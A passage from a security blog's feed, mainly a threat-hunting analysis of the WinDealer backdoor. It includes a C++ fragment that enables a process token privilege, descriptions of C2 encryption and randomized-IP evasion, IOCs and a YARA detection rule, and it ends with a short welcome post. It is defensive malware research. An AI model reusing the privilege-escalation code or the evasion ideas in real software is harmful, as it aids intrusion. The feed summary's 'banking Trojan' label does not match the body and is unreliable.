&lt;p&gt;&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegCreateKeyExA&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-43_1.png&quot; alt=&quot;reg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegDeleteKeyA&lt;/code&gt;&lt;/em&gt; and &lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegCloseKey&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-45.png&quot; alt=&quot;reg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegQueryValueExA&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_16-42.png&quot; alt=&quot;reg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetTokenInformation&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-41.png&quot; alt=&quot;token&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenProcessToken&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-40.png&quot; alt=&quot;token&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenThreadToken&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-39.png&quot; alt=&quot;token&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AdjustTokenPrivileges&lt;/code&gt;&lt;/em&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-33.png&quot; alt=&quot;token&quot; /&gt;&lt;/p&gt;

&lt;p&gt;.etc.&lt;/p&gt;

&lt;p&gt;So, malware sample use one of the interesting classic APT techniques: Token theft via turn on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//....&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;TOKEN_PRIVILEGES&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;LUID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;luid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PrivilegeCount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Privileges&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Luid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;luid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Privileges&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Attributes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SE_PRIVILEGE_ENABLED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LookupPrivilegeValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;luid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OpenProcessToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetCurrentProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ADJUST_PRIVILEGES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AdjustTokenPrivileges&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TOKEN_PRIVILEGES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PTOKEN_PRIVILEGES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PDWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;registry-modifications-and-persistence&quot;&gt;Registry Modifications and Persistence&lt;/h4&gt;

&lt;p&gt;With a high degree of probability, it can be argued that WinDealer has the functionality of interacting with the registry, probably for persistence mechanism:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-01-26_19-04.png&quot; alt=&quot;reg1&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;encryption&quot;&gt;Encryption&lt;/h4&gt;

&lt;p&gt;Generate 16 bytes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AES&lt;/code&gt; key to encrypt C2 communication:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-17.png&quot; alt=&quot;crypt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_13-18.png&quot; alt=&quot;crypt&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;c2-anti-tracking-mechanism&quot;&gt;C2 anti-tracking mechanism&lt;/h4&gt;

&lt;p&gt;This malware sample employs an IP Generation Algorithm to generate a random C2 IP address when the backdoor lacks C2 configuration. The IP produced at random will exist inside particular IP address ranges:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;113.62.0.0 - 113.63.255.255&lt;/code&gt; or   &lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111.120.0.0 - 111.123.255.255&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2/2023-03-30_16-11.png&quot; alt=&quot;ip&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This mechanism will prevent researchers from tracking down the real C2 IP.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Backdoor.Win32.WINDEALER.ZYJA&lt;/code&gt; is a variant of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinDealer&lt;/code&gt; malware family. It is a type of backdoor malware that is designed to allow remote attackers to gain unauthorized access to an infected computer system. Once installed, the malware creates a backdoor on the infected system, which allows the attacker to control the system and steal sensitive data.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Backdoor.Win32.WINDEALER.ZYJA&lt;/code&gt; variant is known to be spread through spear-phishing emails that contain malicious attachments. Once the attachment is opened, the malware is installed and begins to communicate with a remote command-and-control server, allowing the attacker to send commands to the infected system and exfiltrate data.&lt;/p&gt;

&lt;p&gt;The malware is capable of performing a range of malicious activities, including stealing credentials and sensitive data, taking screenshots, recording keystrokes, and executing arbitrary commands on the infected system. The malware is also capable of bypassing antivirus and other security software, making it difficult to detect and remove.&lt;/p&gt;

&lt;h3 id=&quot;iocs&quot;&gt;IOCs&lt;/h3&gt;

&lt;h4 id=&quot;versions&quot;&gt;versions&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Malware&lt;/th&gt;
      &lt;th&gt;version&lt;/th&gt;
      &lt;th&gt;md5&lt;/th&gt;
      &lt;th&gt;sha1&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;WinDealer&lt;/td&gt;
      &lt;td&gt;18.20.1225&lt;/td&gt;
      &lt;td&gt;76ba5272a17fdab7521ea21a57d23591&lt;/td&gt;
      &lt;td&gt;6b831413932a394bd9fb25e2bbdc06533821378c&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;WinDealer&lt;/td&gt;
      &lt;td&gt;18.20.1225&lt;/td&gt;
      &lt;td&gt;cc7207f09a6fe41c71626ad4d3f127ce&lt;/td&gt;
      &lt;td&gt;84e749c37978f9387e16fab29c7b1b291be93a63&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;domain-ips&quot;&gt;domain IPs&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;113.62.0.0/15 111.120.0.0/14&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;55556/TCP&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6999/UDP&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;221.195.68.71/32&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;122.112.245.55/32&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;yara-rules-from-malpedia&quot;&gt;Yara rules (from Malpedia)&lt;/h3&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;rule win_windealer_auto {&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;meta&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;author = &quot;Felix Bilstein - yara-signator at cocacoding dot com&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;date = &quot;2023-01-25&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;version = &quot;1&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;description = &quot;Detects win.windealer.&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;info = &quot;autogenerated rule brought to you by yara-signator&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;tool = &quot;yara-signator v0.6.0&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;signator_config = &quot;callsandjumps;datarefs;binvalue&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_reference = &quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.windealer&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_rule_date = &quot;20230124&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_hash = &quot;2ee0eebba83dce3d019a90519f2f972c0fcf9686&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_version = &quot;20230125&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_license = &quot;CC BY-SA 4.0&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;malpedia_sharing = &quot;TLP:WHITE&quot;&lt;/span&gt;

    &lt;span class=&quot;s&quot;&gt;/* DISCLAIMER&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* The strings used in this rule have been automatically selected from the&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* disassembly of memory dumps and unpacked files, using YARA-Signator.&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* The code and documentation is published here&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;     *&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://github.com/fxb-cocacoding/yara-signator&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* As Malpedia is used as data source, please note that for a given&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* number of families, only single samples are documented.&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* This likely impacts the degree of generalization these rules will offer.&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* Take the described generation method also into consideration when you&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;* apply the rules in your use cases and assign them confidence levels.&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;*/&lt;/span&gt;


    &lt;span class=&quot;s&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;$sequence_0 = { 668b91d2070000 8a89d0070000 52 51 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 4, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   668b91d2070000       | mov                 dx, word ptr [ecx + 0x7d2]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8a89d0070000         | mov                 cl, byte ptr [ecx + 0x7d0]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   52                   | push                edx&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   51                   | push                ecx&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_1 = { ff15???????? 85c0 7407 50 ff15???????? 6a01 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 6, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   ff15????????         |&lt;/span&gt;                     
            &lt;span class=&quot;s&quot;&gt;//   85c0                 | test                eax, eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   7407                 | je                  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;9&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   50                   | push                eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   ff15????????         |&lt;/span&gt;                     
            &lt;span class=&quot;s&quot;&gt;//   6a01                 | push                &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_2 = { 6a01 50 56 e8???????? 83c410 8bc7 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 6, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   6a01                 | push                &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   50                   | push                eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   56                   | push                esi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   e8????????           |&lt;/span&gt;                     
            &lt;span class=&quot;s&quot;&gt;//   83c410               | add                 esp, 0x10&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8bc7                 | mov                 eax, edi&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_3 = { 6a00 ff15???????? 85c0 7407 50 ff15???????? 6a01 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 7, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   6a00                 | push                &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   ff15????????         |&lt;/span&gt;                     
            &lt;span class=&quot;s&quot;&gt;//   85c0                 | test                eax, eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   7407                 | je                  &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;9&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   50                   | push                eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   ff15????????         |&lt;/span&gt;                     
            &lt;span class=&quot;s&quot;&gt;//   6a01                 | push                &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_4 = { 6a04 50 6a04 68???????? 68???????? }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 5, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   6a04                 | push                &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   50                   | push                eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   6a04                 | push                &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   68????????           |&lt;/span&gt;                     
            &lt;span class=&quot;s&quot;&gt;//   68????????           |&lt;/span&gt;                     

        &lt;span class=&quot;s&quot;&gt;$sequence_5 = { 56 57 68da070000 e8???????? }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 4, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   56                   | push                esi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   57                   | push                edi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   68da070000           | push                0x7da&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   e8????????           |&lt;/span&gt;                     

        &lt;span class=&quot;s&quot;&gt;$sequence_6 = { 50 56 e8???????? 83c410 8b4618 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 5, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   50                   | push                eax&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   56                   | push                esi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   e8????????           |&lt;/span&gt;                     
            &lt;span class=&quot;s&quot;&gt;//   83c410               | add                 esp, 0x10&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8b4618               | mov                 eax, dword ptr [esi + 0x18]&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_7 = { 8b4d08 668b91d2070000 8a89d0070000 52 51 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 5, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8b4d08               | mov                 ecx, dword ptr [ebp + 8]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   668b91d2070000       | mov                 dx, word ptr [ecx + 0x7d2]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8a89d0070000         | mov                 cl, byte ptr [ecx + 0x7d0]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   52                   | push                edx&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   51                   | push                ecx&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_8 = { 53 56 57 68da070000 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 4, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   53                   | push                ebx&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   56                   | push                esi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   57                   | push                edi&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   68da070000           | push                0x7da&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;$sequence_9 = { 8b4d08 668b91d2070000 8a89d0070000 52 }&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;// n = 4, score = &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;800&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8b4d08               | mov                 ecx, dword ptr [ebp + 8]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   668b91d2070000       | mov                 dx, word ptr [ecx + 0x7d2]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   8a89d0070000         | mov                 cl, byte ptr [ecx + 0x7d0]&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;//   52                   | push                edx&lt;/span&gt;

    &lt;span class=&quot;na&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;7 of them and filesize &amp;lt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;770048&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By Cyber Threat Hunters from MSSPLab:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/&quot;&gt;@cocomelonc&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/aruzhan-kaldybek-775735226&quot;&gt;@wqkasper&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="threat-hunting" /><category term="blueteam" /><category term="malware" /><category term="malwareanalysis" /><summary type="html">WinDealer is a type of malware that is used for financial fraud and theft. It is a banking Trojan that is designed to steal sensitive financial information, such as login credentials, credit card numbers, and other personal information from victims’ computers.</summary></entry><entry><title type="html">Welcome to our cybersecurity blog</title><link href="http://localhost:4001/tutorial/2023/05/07/welcome.html" rel="alternate" type="text/html" title="Welcome to our cybersecurity blog" /><published>2023-05-07T05:00:00+03:00</published><updated>2023-05-07T05:00:00+03:00</updated><id>http://localhost:4001/tutorial/2023/05/07/welcome</id><content type="html" xml:base="http://localhost:4001/tutorial/2023/05/07/welcome.html">&lt;p&gt;Welcome to our cybersecurity blog!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/1/welcome.png&quot; alt=&quot;welcome&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We will describe techniques for the successful work of the red team, the blue team, threat hunting, research and case studies about penetration testing and programming exploits. This blog will include our investigations into cybersecurity incidents and malware analysis.&lt;/p&gt;

&lt;p&gt;Also, our open source projects will be described here. We will provide the full source codes and we hope it will be a good contribution to the cybersecurity community:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;iostream&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Hello World!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you have questions, you can ask them on our &lt;a href=&quot;mailto:info@mssp.global&quot;&gt;email&lt;/a&gt;.&lt;/p&gt;

